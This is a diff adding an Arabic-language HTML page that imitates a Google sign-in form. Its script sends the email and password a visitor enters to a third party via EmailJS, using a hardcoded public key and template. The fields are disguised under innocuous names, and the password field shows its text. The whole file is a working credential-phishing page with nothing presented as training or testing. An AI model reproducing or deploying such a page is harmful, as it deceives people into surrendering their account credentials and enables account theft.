@@ -1,0 +1,154 @@
+
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>نموذج تسجيل الدخول</title>
+  <style>
+    body {
+      background-image: url('https://i.imgur.com/8bMZ5FQ.png');
+      background-size: cover;
+      background-position: center;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+      margin: 0;
+    }
+    .big-g {
+      font-size: 320px;
+      font-weight: bold;
+      color: #4285F4;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    .header-text {
+      font-size: 96px;
+      color: black;
+      margin-bottom: 30px;
+      text-align: center;
+    }
+    .google-word {
+      font-size: 80px;
+      color: #4285F4;
+      font-weight: bold;
+      margin-bottom: 60px;
+      text-align: center;
+    }
+    .container {
+      width: 90%;
+      max-width: 1200px;
+      margin: auto;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    form {
+      background: white;
+      padding: 60px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      text-align: center;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .field {
+      margin-bottom: 25px;
+      text-align: left;
+    }
+    .field label {
+      display: block;
+      margin-bottom: 10px;
+      font-size: 80px;
+      color: #333;
+    }
+    .field input {
+      width: 100%;
+      padding: 40px;
+      font-size: 24px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background-color: #e0f7e0;
+    }
+    input[type="submit"] {
+      padding: 56px 144px;
+      font-size: 40px;
+      background-color: #4460AA;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    @media (max-width: 600px) {
+      form {
+        padding: 30px 20px;
+      }
+      .field input {
+        padding: 16px;
+        font-size: 16px;
+      }
+      input[type="submit"] {
+        padding: 14px 40px;
+        font-size: 18px;
+      }
+      .big-g {
+        font-size: 48px;
+      }
+      .header-text,
+      .google-word {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="big-g">G</div>
+  <div class="header-text">تسجيل الدخول باستخدام حسابك على</div>
+  <div class="google-word">Google</div>
+
+  <div class="container">
+    <form id="form">
+      <div class="field">
+        <label for="message">الإيميل</label>
+        <input type="text" name="message" id="message">
+      </div>
+      <div class="field">
+        <label for="time">كلمة المرور</label>
+        <input type="text" name="time" id="time">
+      </div>
+      <input type="submit" id="button" value="Next">
+    </form>
+  </div>
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script type="text/javascript">
+    emailjs.init('AkXxMxJH1PnvTsS3e');
+  </script>
+  <script>
+    const btn = document.getElementById('button');
+    const form = document.getElementById('form');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
+      const emailInput = document.getElementById('message').value;
+      const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+
+      if (!emailRegex.test(emailInput)) {
+        alert('الرجاء إدخال بريد إلكتروني صحيح.');
+        btn.value = 'Next';
+        return;
+      }
+
+      btn.value = 'Sending...';
+      emailjs.sendForm('default_service', 'template_92lyur2', this)
+        .then(() => {
+          btn.value = 'Next';
+          alert('Sent!');
+        }, (err) => {
+          btn.value = 'Next';
+          alert(JSON.stringify(err));
+        });
+    });
+  </script>
+</body>
+</html>
